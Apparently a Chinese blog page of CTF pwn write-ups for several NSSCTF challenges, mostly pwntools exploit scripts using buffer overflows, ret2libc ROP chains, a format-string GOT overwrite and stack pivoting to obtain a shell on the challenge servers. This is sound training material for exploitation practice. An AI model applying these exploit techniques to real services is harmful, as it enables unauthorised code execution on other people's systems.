&lt;h5 id=&#34;litctf-2023狠狠的溢出涅~&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#litctf-2023狠狠的溢出涅~&#34;&gt;#&lt;/a&gt; [LitCTF 2023] 狠狠的溢出涅～&lt;/h5&gt;
&lt;p&gt;新知识 \x00 能够截断 strlen&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import time&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;s       = lambda data               :io.send(data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sa      = lambda delim,data         :io.sendafter(str(delim), data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sl      = lambda data               :io.sendline(data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sla     = lambda delim,data         :io.sendlineafter(str(delim), data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r       = lambda num                :io.recv(num)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;itr     = lambda                    :io.interactive()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;uu32    = lambda data               :u32(data.ljust(4,b&amp;#x27;\x00&amp;#x27;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;uu64    = lambda data               :u64(data.ljust(8,b&amp;#x27;\x00&amp;#x27;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ls      = lambda data               :log.success(data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;binary = &amp;#x27;./pwn4&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libelf = &amp;#x27;./libc-2.31.so&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;target = &amp;#x27;&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;target = &amp;#x27;&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.arch      = &amp;#x27;amd64&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level = &amp;#x27;debug&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.terminal  = [&amp;#x27;tme?mux&amp;#x27;,&amp;#x27;splitw&amp;#x27;,&amp;#x27;-h&amp;#x27;,&amp;#x27;-l&amp;#x27;,&amp;#x27;130&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io = remote(&amp;#x27;node4.anna.nssctf.cn&amp;#x27;,28710)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#io = process(binary)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pad = 0x68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf = ELF(binary)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rop = ROP(binary)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc = ELF(libelf)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pop_rdi_ret = rop.find_gadget([&amp;#x27;pop rdi&amp;#x27;,&amp;#x27;ret&amp;#x27;])[0]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;puts_got = elf.got[&amp;#x27;puts&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;puts_plt = elf.plt[&amp;#x27;puts&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;vuln = 0x4006B0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ret = 0x0400768&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pay = pad * b&amp;#x27;\x00&amp;#x27; + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sl(pay)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ru(&amp;#x27;Received\n&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;x = uu64(r(6))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc_base = x - libc.sym[&amp;#x27;puts&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system = libc_base + libc.sym[&amp;#x27;system&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bin_sh = libc_base + next(libc.search(b&amp;#x27;/bin/sh&amp;#x27;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ls(hex(libc_base))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pay = pad * b&amp;#x27;\x00&amp;#x27; + p64(ret)*1 + p64(pop_rdi_ret) + p64(bin_sh) + p64(system) + p64(vuln)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sl(pay)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sl(&amp;#x27;ls&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sl(&amp;#x27;cat flag&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;hnctf-2022-week2ez_backdoor&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#hnctf-2022-week2ez_backdoor&#34;&gt;#&lt;/a&gt; [HNCTF 2022 WEEK2]ez_backdoor&lt;/h5&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import time&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io = remote(&amp;#x27;node5.anna.nssctf.cn&amp;#x27;,28762)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(log_level=&amp;#x27;debug&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#io = process(binary)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bin_sh=0x4011CA&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ret=0x40101a&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=b&amp;#x27;a&amp;#x27;*(0x108)+p64(ret)+p64(bin_sh)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.sendafter(b&amp;#x27;llenge\n&amp;#x27;,payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;nisactf-2022shop_pwn&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#nisactf-2022shop_pwn&#34;&gt;#&lt;/a&gt; [NISACTF 2022]shop_pwn&lt;/h5&gt;
&lt;p&gt;ida 查看 game 函数里面有一个函数来创建多线程，但是有个 bug，money 是公共资源，这个线程创建时另外一个线程也创建了，如果太快会造成都在卖那个 pen 直接构造一个&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;echo -e &amp;quot;3\n0\n3\n0\n2\n1\n1\&amp;quot;|nc node5.anna.nssctf.cn 28765&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;即可查看到 flag&lt;/p&gt;
&lt;h5 id=&#34;hdctf-2023keep-on&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#hdctf-2023keep-on&#34;&gt;#&lt;/a&gt; [HDCTF 2023]KEEP ON&lt;/h5&gt;
&lt;p&gt;这个题注意的字符串溢出是一个点还能够利用栈迁移来获取 shell，字符串溢出的话是利用 printf 的溢出点是 6 然后使用 fmtstr_payload 来让 system_plt 来和 printf_got 进行切换在利用后面那个 read 允许溢出 8 个字节来返回到 vuln 去在字符串溢出这里输入 /bin/sh 即可得到 shell&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;figcaption&gt;&lt;span&gt;ON&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(arch=&amp;#x27;amd64&amp;#x27;, os=&amp;#x27;linux&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level = &amp;#x27;debug&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf = ELF(&amp;quot;./hdctf&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#p = process(&amp;#x27;./hdctf&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p = remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28307)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system_plt = elf.plt[&amp;#x27;system&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;printf_got = elf.got[&amp;#x27;printf&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#gdb.attach(p)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#pause()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload1 = fmtstr_payload(6, &amp;#123;printf_got: system_plt&amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;log.info(payload1)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sleep(0.1)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendafter(&amp;#x27;name: \n&amp;#x27;,payload1)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;vuln_addr = 0x40076F&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#pause()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload2 =b&amp;#x27;a&amp;#x27;*(0x50+0x8) + p64(vuln_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sleep(0.1)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendafter(&amp;#x27;on !\n&amp;#x27;,payload2)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#pause()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sleep(0.1)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendafter(&amp;#x27;name: \n&amp;#x27;,&amp;quot;/bin/sh\x00&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;还能使用栈迁移如:&lt;br /&gt;
 使用字符串泄露来得到 rbp 栈底位置，使用 stack 查看 rbp 是多少在使用溢出满满调试得到为 %16p 即可得到 rbp，在 s 处输入字符后使用 pwndbg 的 search 查看位置，然后在计算和 s 的值相差多少，使用 pwndbg 的 distance 即可计算出相差量为 60,rbp 和 s 相差 0x60 还有 0x8 的返回地址，即可算到需要迁移的栈地址为多多 qianyi_rbp-0x60-0x8, 在使用常规的 rdi pop;ret 来将 /bin/sh 压入 system 函数中，但是中间需要加一个 qianyi_rbp-0x20 来维持栈平衡&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(log_level=&amp;#x27;debug&amp;#x27;,os=&amp;#x27;linux&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io=remote(&amp;#x27;node4.anna.nssctf.cn&amp;#x27;,28526)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.recvuntil(b&amp;#x27;name: \n&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf=ELF(&amp;#x27;./hdctf&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fmtpayload = b&amp;#x27;%16$p&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.send(fmtpayload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.recvuntil(b&amp;#x27;hello,0x&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;old_rbp = int(io.recv(12), 16)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;log.success(&amp;#x27;RBP Addr: &amp;#x27; + (hex(old_rbp)))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;leave_ret = 0x4007F2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rdi = 0x4008D3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system = elf.sym[&amp;#x27;system&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Target_Addr = old_rbp - 0x60 - 0x08&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# RDI will pop binsh addr as system&amp;#x27;s arg&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# Offset : 0x08&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Payload = p64(rdi)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# Offset : 0x08 + 0x08&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Payload += p64(Target_Addr + 0x8 + 0x18)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# Offset : 0x08 + 0x10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Payload += p64(system)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# Offset : 0x08 + 0x18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Payload += b&amp;#x27;/bin/sh\x00&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# Fill the Payload to 0x50.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Payload = Payload.ljust(0x50, b&amp;#x27;\x00&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# The Leave Ret cmd&amp;#x27;s ret addr.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Payload += p64(Target_Addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# The Leave Ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Payload += p64(leave_ret)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;log.info(Payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.recvuntil(b&amp;#x27;keep on !\n&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.send(Payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;swpuctf-2022-新生赛shellcode&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#swpuctf-2022-新生赛shellcode&#34;&gt;#&lt;/a&gt; [SWPUCTF 2022 新生赛] shellcode？&lt;/h5&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS1zaGVsbGNyYWZ0LXNqMnA2NDNhanQ4Y3V0MmFxaTNhYnRlZTQ3Y2d3NGN2aWE3MmNuMjRlLnNo&#34;&gt;还不能输入比较长的我用 shellcraft.sh&lt;/span&gt; () 生成不行&lt;/p&gt;
